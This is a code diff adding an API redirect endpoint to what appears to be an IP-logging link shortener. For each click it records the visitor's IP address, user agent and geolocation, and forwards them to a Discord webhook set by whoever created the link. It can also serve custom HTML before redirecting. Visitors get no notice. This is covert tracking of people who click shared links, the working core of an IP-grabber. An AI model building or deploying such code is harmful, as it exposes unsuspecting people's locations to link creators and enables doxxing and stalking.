@@ -205,6 +205,60 @@ async def delete_url(short_code: str):
         raise HTTPException(status_code=404, detail="URL not found")
     return {"message": "URL deleted successfully"}
 
+@api_router.get("/redirect/{short_code}")
+async def handle_redirect_api(short_code: str, request: Request):
+    """Handle short URL redirect via API (for frontend integration)"""
+    # Find URL record
+    url_record = await db.urls.find_one({"short_code": short_code})
+    if not url_record:
+        raise HTTPException(status_code=404, detail="URL not found")
+    
+    # Get visitor information
+    client_ip = request.client.host
+    if 'x-forwarded-for' in request.headers:
+        client_ip = request.headers['x-forwarded-for'].split(',')[0].strip()
+    elif 'x-real-ip' in request.headers:
+        client_ip = request.headers['x-real-ip']
+    
+    user_agent = request.headers.get('user-agent', '')
+    
+    # Get geolocation data
+    geo_data = await get_ip_geolocation(client_ip)
+    
+    # Store visitor data
+    visitor_data = VisitorData(
+        short_code=short_code,
+        ip_address=client_ip,
+        user_agent=user_agent,
+        geolocation=geo_data
+    )
+    
+    await db.visitors.insert_one(visitor_data.dict())
+    
+    # Update click count
+    await db.urls.update_one(
+        {"short_code": short_code},
+        {"$inc": {"click_count": 1}}
+    )
+    
+    # Send to Discord webhook
+    await send_discord_webhook(
+        url_record['discord_webhook'],
+        short_code,
+        {
+            'ip_address': client_ip,
+            'user_agent': user_agent,
+            'geolocation': geo_data
+        }
+    )
+    
+    # Return redirect URL for frontend to handle
+    return {
+        "redirect_url": url_record['redirect_url'],
+        "custom_html": url_record.get('custom_html'),
+        "message": "Redirect data processed"
+    }
+
 # Non-API route for short URL handling
 @app.get("/{short_code}")
 async def handle_short_url(short_code: str, request: Request):
